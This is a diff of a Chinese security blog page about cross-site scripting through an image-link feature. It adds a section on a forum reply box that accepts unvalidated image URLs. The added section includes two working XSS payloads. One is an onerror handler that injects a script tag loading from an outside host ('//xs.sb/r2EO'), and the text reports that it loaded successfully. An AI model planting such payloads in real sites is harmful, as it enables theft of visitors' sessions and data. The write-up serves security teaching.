@@ -19,7 +19,7 @@
 <meta property="og:description" content="未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/0.jpg">
-<meta property="og:updated_time" content="2019-12-05T17:05:38.231Z">
+<meta property="og:updated_time" content="2019-12-07T07:08:32.879Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一处图片引用功能导致的XSS">
 <meta name="twitter:description" content="未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。">
@@ -173,7 +173,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    5 分钟 读完 (大约 704 个字)
+                    7 分钟 读完 (大约 1010 个字)
                 </span>
                 
                 
@@ -229,6 +229,21 @@
 <p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/7.png" alt="7"></p>
 <p>最终在没有任何错误内容显示的情况下成功执行了xss payload：</p>
 <p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/8.png" alt="8"></p>
+<p>看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。</p>
+<h1 id="灵活运用"><a href="#灵活运用" class="headerlink" title="灵活运用"></a>灵活运用</h1><p>这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。</p>
+<p>本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。</p>
+<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.1.jpg" alt="2.1"></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;XSSURL&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>这里直接把payload放进去，看下前端显示</p>
+<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.2.jpg" alt="2.2"></p>
+<p>同样的思路，这里直接闭合就好了</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror=&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;//xs.sb/r2EO&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.3.jpg" alt="2.3"></p>
+<p>成功加载payload</p>
+<p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.4.jpg" alt="2.4"></p>
+<p>平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。</p>
 
         </div>
         
@@ -392,7 +407,11 @@
         <a class="is-flex" href="#闭合成功">
         <span class="has-mr-6">2.4</span>
         <span>闭合成功</span>
-        </a></li></ul></li></ul>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#灵活运用">
+        <span class="has-mr-6">3</span>
+        <span>灵活运用</span>
+        </a></li></ul>
         </div>
     </div>
 </div>
